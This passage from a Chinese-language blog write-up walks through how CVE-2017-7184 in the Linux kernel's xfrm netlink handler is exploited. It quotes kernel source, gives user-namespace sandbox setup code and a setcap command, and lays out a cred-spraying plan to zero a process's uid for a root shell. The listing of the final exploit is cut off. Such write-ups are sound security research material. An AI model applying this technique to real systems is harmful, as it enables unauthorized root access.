class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">netlink_rcv_skb</span><span class=\"params\">(struct sk_buff *skb, <span class=\"keyword\">int</span> (*cb)</span><span class=\"params\">(struct sk_buff *,</span></span></span><br><span class=\"line\">     struct nlmsghdr *))</span><br><span class=\"line\">{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlmsghdr</span> *<span class=\"title\">nlh</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> err;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> (skb-&gt;len &gt;= nlmsg_total_size(<span class=\"number\">0</span>)) {</span><br><span class=\"line\"><span class=\"keyword\">int</span> msglen;</span><br><span class=\"line\"></span><br><span class=\"line\">nlh = nlmsg_hdr(skb);</span><br><span class=\"line\">err = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN || skb-&gt;len &lt; nlh-&gt;nlmsg_len)</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Only requests are handled by the kernel */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_REQUEST))</span><br><span class=\"line\"><span class=\"keyword\">goto</span> ack;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Skip control messages */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (nlh-&gt;nlmsg_type &lt; NLMSG_MIN_TYPE)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> ack;</span><br><span class=\"line\"></span><br><span class=\"line\">err = cb(skb, nlh);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (err == -EINTR)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> skip;</span><br><span class=\"line\"></span><br><span class=\"line\">ack:</span><br><span class=\"line\"><span class=\"keyword\">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_ACK || err)</span><br><span class=\"line\">netlink_ack(skb, nlh, err);</span><br><span class=\"line\"></span><br><span class=\"line\">skip:</span><br><span class=\"line\">msglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (msglen &gt; skb-&gt;len)</span><br><span class=\"line\">msglen = skb-&gt;len;</span><br><span class=\"line\">skb_pull(skb, msglen);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L2444\" target=\"_blank\" rel=\"noopener\">xfrm_user_rcv_msg</a>函数中，会根据<code>nlmsg_type</code>到<code>xfrm_dispatch</code>中查找对应要调用的函数，并在[2]处检查对应需要的权限，而在[3]处会根据<code>nla</code>中参数类型，来初始化一个<code>** attr</code>，作为用户输入参数的索引。最终调用<code>link-&gt;doit</code>去执行。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">xfrm_user_rcv_msg</span><span class=\"params\">(struct sk_buff *skb, struct nlmsghdr *nlh)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">net</span> *<span class=\"title\">net</span> = <span class=\"title\">sock_net</span>(<span class=\"title\">skb</span>-&gt;<span class=\"title\">sk</span>);</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> *<span class=\"title\">attrs</span>[<span class=\"title\">XFRMA_MAX</span>+1];</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_link</span> *<span class=\"title\">link</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> type, err;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_COMPAT</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (in_compat_syscall())</span><br><span class=\"line\"><span class=\"keyword\">return</span> -EOPNOTSUPP;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">type = nlh-&gt;nlmsg_type;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (type &gt; XFRM_MSG_MAX)</span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">type -= XFRM_MSG_BASE;</span><br><span class=\"line\">[<span class=\"number\">1</span>]link = &amp;xfrm_dispatch[type];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* All operations require privileges, even GET */</span></span><br><span class=\"line\">[<span class=\"number\">2</span>]<span class=\"keyword\">if</span> (!netlink_net_capable(skb, CAP_NET_ADMIN)) <span class=\"comment\">//检查进程权限</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> -EPERM;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((type == (XFRM_MSG_GETSA - XFRM_MSG_BASE) ||</span><br><span class=\"line\"> type == (XFRM_MSG_GETPOLICY - XFRM_MSG_BASE)) &amp;&amp;</span><br><span class=\"line\"> (nlh-&gt;nlmsg_flags &amp; NLM_F_DUMP)) {</span><br><span class=\"line\"><span class=\"keyword\">if</span> (link-&gt;dump == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">netlink_dump_control</span> <span class=\"title\">c</span> = {</span></span><br><span class=\"line\">.dump = link-&gt;dump,</span><br><span class=\"line\">.done = link-&gt;done,</span><br><span class=\"line\">};</span><br><span class=\"line\"><span class=\"keyword\">return</span> netlink_dump_start(net-&gt;xfrm.nlsk, skb, nlh, &amp;c);</span><br><span class=\"line\">}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">3</span>]err = nlmsg_parse(nlh, xfrm_msg_min[type], attrs,</span><br><span class=\"line\"> link-&gt;nla_max ? : XFRMA_MAX,</span><br><span class=\"line\"> link-&gt;nla_pol ? : xfrma_policy);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (err &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">return</span> err;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (link-&gt;doit == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> link-&gt;doit(skb, nlh, attrs);</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>从<code>xfrm_dispatch</code>可见，我们所需的<code>XFRM_MSG_NEWSA</code>及<code>XFRM_MSG_NEWAE</code>，仅需将<code>nlmsg_type</code>设置为相应值即可。</p>\n <figure class=\"highlight plain\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\">xfrm_dispatch[XFRM_NR_MSGTYPES] = {</span><br><span class=\"line\">[XFRM_MSG_NEWSA       - XFRM_MSG_BASE] = { .doit = xfrm_add_sa        },</span><br><span class=\"line\">[XFRM_MSG_DELSA       - XFRM_MSG_BASE] = { .doit = xfrm_del_sa        },</span><br><span class=\"line\">[XFRM_MSG_GETSA       - XFRM_MSG_BASE] = { .doit = xfrm_get_sa,</span><br><span class=\"line\">   .dump = xfrm_dump_sa,</span><br><span class=\"line\"> .done = xfrm_dump_sa_done },</span><br><span class=\"line\">[XFRM_MSG_NEWPOLICY - XFRM_MSG_BASE] = { .doit = xfrm_add_policy },</span><br><span class=\"line\">[XFRM_MSG_DELPOLICY - XFRM_MSG_BASE] = { .doit = xfrm_get_policy },</span><br><span class=\"line\">[XFRM_MSG_GETPOLICY - XFRM_MSG_BASE] = { .doit = xfrm_get_policy,</span><br><span class=\"line\"> .dump = xfrm_dump_policy,</span><br><span class=\"line\"> .done = xfrm_dump_policy_done },</span><br><span class=\"line\">[XFRM_MSG_ALLOCSPI - XFRM_MSG_BASE] = { .doit = xfrm_alloc_userspi },</span><br><span class=\"line\">[XFRM_MSG_ACQUIRE - XFRM_MSG_BASE] = { .doit = xfrm_add_acquire },</span><br><span class=\"line\">[XFRM_MSG_EXPIRE - XFRM_MSG_BASE] = { .doit = xfrm_add_sa_expire },</span><br><span class=\"line\">[XFRM_MSG_UPDPOLICY - XFRM_MSG_BASE] = { .doit = xfrm_add_policy },</span><br><span class=\"line\">[XFRM_MSG_UPDSA - XFRM_MSG_BASE] = { .doit = xfrm_add_sa },</span><br><span class=\"line\">[XFRM_MSG_POLEXPIRE - XFRM_MSG_BASE] = { .doit = xfrm_add_pol_expire},</span><br><span class=\"line\">[XFRM_MSG_FLUSHSA - XFRM_MSG_BASE] = { .doit = xfrm_flush_sa },</span><br><span class=\"line\">[XFRM_MSG_FLUSHPOLICY - XFRM_MSG_BASE] = { .doit = xfrm_flush_policy },</span><br><span class=\"line\">[XFRM_MSG_NEWAE - XFRM_MSG_BASE] = { .doit = xfrm_new_ae },</span><br><span class=\"line\">[XFRM_MSG_GETAE - XFRM_MSG_BASE] = { .doit = xfrm_get_ae },</span><br><span class=\"line\">[XFRM_MSG_MIGRATE - XFRM_MSG_BASE] = { .doit = xfrm_do_migrate },</span><br><span class=\"line\">[XFRM_MSG_GETSADINFO - XFRM_MSG_BASE] = { .doit = xfrm_get_sadinfo },</span><br><span class=\"line\">[XFRM_MSG_NEWSPDINFO - XFRM_MSG_BASE] = { .doit = xfrm_set_spdinfo,</span><br><span class=\"line\"> .nla_pol = xfrma_spd_policy,</span><br><span class=\"line\"> .nla_max = XFRMA_SPD_MAX },</span><br><span class=\"line\">[XFRM_MSG_GETSPDINFO - XFRM_MSG_BASE] = { .doit = xfrm_get_spdinfo },</span><br><span class=\"line\">};</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>而<code>Family Header</code>需要到对应的处理函数中找，以<code>xfrm_add_sa</code>为例，其调用<code>nlmsg_data</code>函数的赋值变量类型为<code>xfrm_usresa_info</code>，即为<code>Family Header</code>。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_usersa_info</span> *<span class=\"title\">p</span> = <span class=\"title\">nlmsg_data</span>(<span class=\"title\">nlh</span>);</span></span><br /></pre></td>\n   </tr>\n  </table>\n </figure>\n <h2 id=\"利用思路\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h2>\n <h3 id=\"权限限制\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#权限限制\" class=\"headerlink\" title=\"权限限制\"></a>权限限制</h3>\n <p>所谓权限限制即是在上文中提到的<code>netlink_net_capable(skb, CAP_NET_ADMIN)</code>检查，所需为<code>CAP_NET_ADMIN</code>权限。但在<code>Linux</code>操作系统中存在命名空间这样的权限隔离机制，在每一个<code>NET</code>沙箱中，非<code>ROOT</code>进程可以具有<code>CAP_NET_ADMIN</code>权限。查看命名空间开启的方式为<code>cat /boot/config* | grep CONFIG_USER_NS</code>，若为「y」，则启用了命名空间。</p>\n <p>而对于上述限制的绕过有两种方法，一是使用<code>setcap</code>命令为<code>EXP</code>赋予权限，即执行<code>sudo setcap cap_net_raw,cap_net_admin=eip ./exp</code>。二是仿照<a href=\"https://github.com/ret2p4nda/linux-kernel-exploits/tree/master/2017/CVE-2017-7308\" target=\"_blank\" rel=\"noopener\">CVE-2017-7308</a>中设置<code>namespace sandbox</code>，但注意此时无法利用<code>getuid</code>来判断是否为<code>root</code>用户。</p>\n <figure class=\"highlight plain\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\">void setup_sandbox() {</span><br><span class=\"line\">int real_uid = getuid();</span><br><span class=\"line\">int real_gid = getgid();</span><br><span class=\"line\"></span><br><span class=\"line\">        if (unshare(CLONE_NEWUSER) != 0) {</span><br><span class=\"line\">perror(\"[-] unshare(CLONE_NEWUSER)\");</span><br><span class=\"line\">exit(EXIT_FAILURE);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"> if (unshare(CLONE_NEWNET) != 0) {</span><br><span class=\"line\">perror(\"[-] unshare(CLONE_NEWUSER)\");</span><br><span class=\"line\">exit(EXIT_FAILURE);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">if (!write_file(\"/proc/self/setgroups\", \"deny\")) {</span><br><span class=\"line\">perror(\"[-] write_file(/proc/self/set_groups)\");</span><br><span class=\"line\">exit(EXIT_FAILURE);</span><br><span class=\"line\">}</span><br><span class=\"line\">if (!write_file(\"/proc/self/uid_map\", \"0 %d 1\\n\", real_uid)){</span><br><span class=\"line\">perror(\"[-] write_file(/proc/self/uid_map)\");</span><br><span class=\"line\">exit(EXIT_FAILURE);</span><br><span class=\"line\">}</span><br><span class=\"line\">if (!write_file(\"/proc/self/gid_map\", \"0 %d 1\\n\", real_gid)) {</span><br><span class=\"line\">perror(\"[-] write_file(/proc/self/gid_map)\");</span><br><span class=\"line\">exit(EXIT_FAILURE);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">cpu_set_t my_set;</span><br><span class=\"line\">CPU_ZERO(&amp;my_set);</span><br><span class=\"line\">CPU_SET(0, &amp;my_set);</span><br><span class=\"line\">if (sched_setaffinity(0, sizeof(my_set), &amp;my_set) != 0) {</span><br><span class=\"line\">perror(\"[-] sched_setaffinity()\");</span><br><span class=\"line\">exit(EXIT_FAILURE);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">if (system(\"/sbin/ifconfig lo up\") != 0) {</span><br><span class=\"line\">perror(\"[-] system(/sbin/ifconfig lo up)\");</span><br><span class=\"line\">exit(EXIT_FAILURE);</span><br><span class=\"line\">}</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <h3 id=\"数据包构造\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#数据包构造\" class=\"headerlink\" title=\"数据包构造\"></a>数据包构造</h3>\n <p>本漏洞属于一个利用条件比较宽松的漏洞。首先，<code>xfrm_replay_state_esn</code>是一个变长的数据结构，而其长度可以由用户输入的<code>bmp_len</code>来控制，并由<code>kzalloc</code>申请<code>bmp_len *4 + 0x18</code>大小的内存块。其次，越界读写可以每次写1<code>bit</code>大小的数据，同时也可以将<code>(replay_windows -1)&gt;&gt;5</code>比特大小的内存块清空。</p>\n <p>并且<code>cred</code>结构体的申请是通过<code>prepare_creds</code>中的<code>new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</code>得到的，但在调试中发现，本内核的<code>cred_jar</code>是<code>kmalloc-192</code>。</p>\n <p><img src=\"https://wx2.sinaimg.cn/large/d9e4cccely1g099iiczvgj20yt0mgwl5.jpg\" alt=\"\" /></p>\n <p>根据内核分配使用的<code>slub</code>+伙伴算法可以知道，对于同一个<code>kmem_cache</code>分配出来的内存块有一定概率是相邻。因此一种很取巧的思路，就是将<code>xfrm_replay_state_esn</code>结构体设置为<code>192(0xc0)</code>以内，以利用<code>kmalloc-192</code>进行分配，并利用<code>fork</code>新建大量进程，使申请大量<code>cred</code>，这样喷射之后有很大概率越界读写漏洞存在的位置之后就是一个<code>cred</code>结构体，这样利用之前提到过的置零一段内存的操作就可以将<code>cred</code>结构体中的部分成员<code>(uid gid等)</code>置零，从而对该进程提权，并通过反弹<code>shell</code>就可以得到一个<code>root</code>权限的<code>shell</code>。</p>\n <p>因此对于数据包构造主要根据上述思路。</p>\n <p><strong>xfrm_add_sa</strong></p>\n <p>在触发<code>xfrm_add_sa</code>函数的数据包中，需要满足<code>128 &lt; bmp_len * 4 +0x18 &lt; 192</code>。并且需要参考之前源码分析中的各项<code>flag</code>及参数检查。</p>\n <p><strong>xfrm_new_ae</strong></p>\n <p>在触发<code>xfrm_new_ae</code>函数的数据包中，需要对<code>seq_hi</code>、<code>seq</code>及<code>replay_window</code>进行设定，<code>replay_window</code>即将要置零的长度大小，由于连续申请了两块大小相同的结构体，而置零的时候是从第一次申请的位置操作的，有可能出现二者相邻，因此需要将<code>replay_window</code>设置稍大一些。而<code>seq_hi</code>、<code>seq</code>两个数据需要结合之后发送的<code>ah</code>数据包中的<code>seq</code>参数，引导<code>xfrm_replay_advance_esn</code>走向置零<code>bmp[0]~bmp[n]</code>这个分支。</p>\n <p><strong>AH数据包</strong></p>\n <p><code>AH</code>数据包的要求即<code>spi</code>需要和之前申请<code>SA</code>的<code>spi</code>相同用于寻找<code>xfrm_state</code>，并且需要满足</p>\n <p><code>diff &gt;= replay_esn-&gt;replay_window</code>，其中<code>diff</code>的数据由<code>xfrm_replay_state_esn</code>中的<code>seq</code>、<code>seq_hi</code>及<code>AH</code>的<code>seq</code>共同决定。还行需在后续单字节写的位置，将<code>cred</code>结构体中<code>usage</code>置回原值。</p>\n <p>在<code>xfrm_replay_advance_esn</code>函数执行前后发现，相邻<code>cred</code>中的成员被置零。</p>\n <p><img src=\"https://ws2.sinaimg.cn/large/d9e4cccely1g09aint3orj20qq0mzadz.jpg\" alt=\"xfrm_replay_advance_esn函数执行前\" /></p>\n <p><img src=\"https://wx2.sinaimg.cn/large/d9e4cccely1g09bwjx91qj20q90jftaz.jpg\" alt=\"\" /></p>\n <h2 id=\"EXP\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span 